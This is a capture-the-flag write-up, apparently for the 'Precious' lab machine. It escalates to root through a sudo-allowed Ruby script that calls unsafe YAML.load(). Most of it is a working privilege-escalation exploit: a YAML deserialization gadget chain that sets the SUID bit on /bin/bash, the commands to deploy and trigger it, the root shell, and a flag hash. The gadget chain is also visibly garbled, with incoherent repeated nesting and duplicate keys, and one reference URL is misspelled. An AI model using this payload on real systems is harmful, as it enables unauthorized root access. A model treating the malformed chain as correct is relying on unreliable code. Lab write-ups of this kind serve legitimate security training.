# Precious — Privilege Escalation

**Current User:** henry | **Target:** root | **Ruby:** 2.7.0  
**Vector:** `sudo /usr/bin/ruby /opt/update_dependencies.rb` → unsafe `YAML.load()` → root

---

## Discovery

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

cat /opt/update_dependencies.rb
# → YAML.load(File.read('/opt/update_dependencies.yml'))  # no safe_load
```

---

## Exploitation

### Step 1 — Create Malicious YAML Payload

Target runs **Ruby 2.7.0** — `Gem::DependencyList` chain is patched; use **`Gem::Installer`** chain.

Command to execute: `chmod 4755 /bin/bash`

Create `/tmp/payload.yml`:

```yaml
---
- !ruby/object:Gem::Installer
  @source: !ruby/object:Gem::Package::TarReader
    @io: !ruby/object:Net::BufferedIO
      @debug_output: !ruby/object:Net::WriteAdapter
        @socket: !ruby/object:Gem::RequestSet
          @sets: !ruby/object:Gem::RequestSet::Ruby
            @install_dir: /var/lib/gems/2.7.0
            @specs: []
          @deps: !ruby/object:Hash
          '`chmod 4755 /bin/bash`':
            !ruby/object:Gem::Requirement
              requirements:
                !ruby/object:Gem::Package::TarReader::Entry
                  header: ''
                  header_map: !ruby/object:Net::BufferedIO
                    @debug_output: !ruby/object:Net::WriteAdapter
                      @socket: !ruby/object:Gem::RequestSet::Ruby
                        @install_dir: /tmp/dir
                        @specs: []
                      @deps: !ruby/object:Hash {}
                    @src: !ruby/object:Gem::Package::TarReader::Entry
                      header: ''
                      header_map: !ruby/object:Net::BufferedIO
                        @debug_output: !ruby/object:Net::WriteAdapter
                          @socket: !ruby/object:Gem::RequestSet
                            @sets: !ruby/object:Gem::RequestSet::Ruby
                              @install_dir: "`chmod 4755 /bin/bash`"
                              @specs: []
                            @deps: !ruby/object:Hash {}
                          @src: !ruby/object:Gem::Package::TarReader::Entry
                            header: ''
                            @io: !ruby/object:IO {}
                      @io: !ruby/object:Net::BufferedIO
                        @debug_output: !ruby/object:Net::WriteAdapter
                          @socket: !ruby/object:Gem::Installer
                            @source: !ruby/object:Gem::SpecFetcher
                              @cache: !ruby/object:Hash
                              @specs: !ruby/object:Gem::Requirement
                                requirements:
                                  '`id`':
                                    - !ruby/sym :include
                                    - !ruby/object:Gem::Package::TarReader::Entry
                                      header: ''
                                      header_map: !ruby/object:Net::BufferedIO
                                        @debug_output: !ruby/object:Net::WriteAdapter
                                          @socket: !ruby/object:Gem::RequestSet::Ruby
                                            @install_dir: /tmp/dir
                                            @specs: []
                                          @deps: !ruby/object:Hash {}
                                        @src: !ruby/object:Gem::Package::TarReader::Entry
                                          header: ''
                                          @io: !ruby/object:IO {}
                                - !ruby/object:Gem::Package::TarReader::Entry
                                  header: ''
                                  header_map: !ruby/object:Net::BufferedIO
                                    @debug_output: !ruby/object:Net::WriteAdapter
                                      @socket: !ruby/object:Gem::RequestSet
                                        @sets: !ruby/object:Gem::RequestSet::Ruby
                                          @install_dir: "`chmod 4755 /bin/bash`"
                                          @specs: []
                                        @deps: !ruby/object:Hash {}
                                      @src: !ruby/object:Gem::Package::TarReader::Entry
                                        header: ''
                                        @io: !ruby/object:IO {}
                                  @io: !ruby/object:IO {}
                                @current: null
                                @indexer: null
                              @found: {}
                              @fetcher: null
                            @source: !ruby/object:Gem::Package::TarReader
                              @io: !ruby/object:Net::BufferedIO
                                @debug_output: !ruby/object:Net::WriteAdapter
                                  @socket: !ruby/object:Gem::RequestSet::Ruby
                                    @install_dir: ''
                                    @specs: []
                                  @deps: !ruby/object:Hash {}
                                @src: !ruby/object:Gem::Package::TarReader::Entry
                                  header: ''
                                  @io: !ruby/object:IO {}
                          @src: !ruby/object:Gem::Package::TarReader::Entry
                            header: ''
                            @io: !ruby/object:IO {}
                  @io: !ruby/object:IO
```

### Step 2 — Deploy and Trigger

```bash
cp /tmp/payload.yml /opt/update_dependencies.yml
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

### Step 3 — Root Shell

```bash
/bin/bash -p
# uid=0(root) gid=0(root) ✅
cat /root/root.txt
# 36b8227ef79c5b2a7987c68b4b551d5c
```

---

## Gadget Chain (Ruby 2.7.0)

| Chain | Status | Notes                                  |
|-------|--------|----------------------------------------|
| `Gem::DependencyList` + `Gem::StubSpecification` | ❌ | Patched in Ruby 2.7+ |
| `Gem::Installer` → `Gem::RequestSet` → `Kernel.system` | ✅ | Works on Ruby 2.7.0 |

**Path:** `Gem::Installer` → `Gem::SpecFetcher` → `Gem::Requirement` → `Gem::Package::TarReader` → `Net::BufferedIO` → `Net::WriteAdapter` → `Gem::RequestSet` → `Kernel.system`

---

## Troubleshooting

| Error | Cause | Fix |
|-------|-------|-----|
| `TypeError: nil is not a symbol` | Missing object attributes in chain | Ensure all referenced objects are defined |
| `undefined method 'size' for nil` | Wrong gadget chain (DependencyList) | Use Gem::Installer chain |
| Silent fail / no output | Malformed YAML structure | Check all nesting and closing tags |

---

## Verification

- [x] `sudo -l` confirms NOPASSWD for ruby script
- [x] `/opt/update_dependencies.rb` uses unsafe `YAML.load()`
- [x] Gem::Installer gadget chain executed successfully
- [x] SUID bit set on `/bin/bash`
- [x] Root shell obtained via `/bin/bash -p`
- [x] Root flag captured

---

## References

- [vakzz — YAML deserialization research](https://github.com/vakzz)
- [Staaldraad — Packaged Ruby YAML gadget chain](https://staaldraad.github.io/)
- [PayloadsAllTheThings — Ruby Insecure Deserialization](https://github.com/swlesskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Ruby)
- [GTFObins — bash SUID](https://gtfobins.github.io/)
